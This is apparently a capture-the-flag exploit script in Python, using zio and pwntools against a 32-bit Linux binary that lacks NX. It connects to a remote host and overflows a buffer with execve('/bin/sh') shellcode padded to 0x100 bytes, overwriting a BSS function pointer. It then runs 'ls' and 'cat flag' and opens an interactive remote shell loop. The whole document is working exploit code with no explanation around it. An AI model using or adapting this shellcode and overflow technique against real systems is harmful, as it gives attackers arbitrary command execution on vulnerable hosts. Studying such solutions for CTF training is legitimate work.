# encoding:utf-8
# 32位无NX， 覆盖BSS段函数指针

from zio import *
from pwn import *

func = 0x804A160
bss_data = 0x804A060

context(arch='i386', os='linux', log_level='debug')

io = zio(('101.200.187.112',9004),timeout = 9999, 
#io = zio('./pwn1', timeout = 9999, 
        print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW,'blue'))



io.read_until(':')

#io.gdb_hint(breakpoints= [0x08048600])

'''
Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al


 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80


'''

shellcode  = "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x08\x40\x40\x40"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80";

payload = shellcode.ljust(0x100,'A')
payload += p32(bss_data)

io.writeline(payload)
#io.read_until_timeout()
io.read_until_timeout()
io.writeline('ls')
io.read_until_timeout()
io.writeline('cat flag')
io.read_until_timeout()

while True:

	io.writeline(raw_input('>'))
	io.read_until_timeout()